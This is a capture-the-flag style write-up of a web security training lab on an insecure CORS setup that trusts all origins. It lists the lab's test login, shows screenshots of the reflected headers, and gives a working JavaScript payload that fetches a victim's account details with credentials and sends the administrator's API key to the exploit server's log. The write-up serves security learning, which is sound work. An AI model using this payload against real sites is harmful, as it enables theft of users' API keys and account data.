
This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter


1. Log in with the provided credentials.

2. Observe that there is a request that asks for all the user details, and notice it responds with the API key. Also, in the response there is the header *Access-Control-Allow-Credentials* which suggests it may supports CORS. 

<img width="1448" height="510" alt="image" src="https://github.com/user-attachments/assets/84d3aa00-d768-4d14-966b-75aabfe23e54" />

3. In the repeater add the header `Origin:https://test.com` observe that the header *Access-Control-Allow-Credentials* reflects your Origin header.

<img width="1448" height="470" alt="image" src="https://github.com/user-attachments/assets/1059f7c9-bac6-42c3-831a-abf9933a5262" />

4. In the exploit server input this code 

`<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0add00550418535a80c39f1000eb000a.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>`


and deliver it to the victim, you will see that in the access log it will respond with the API key of the administrator.
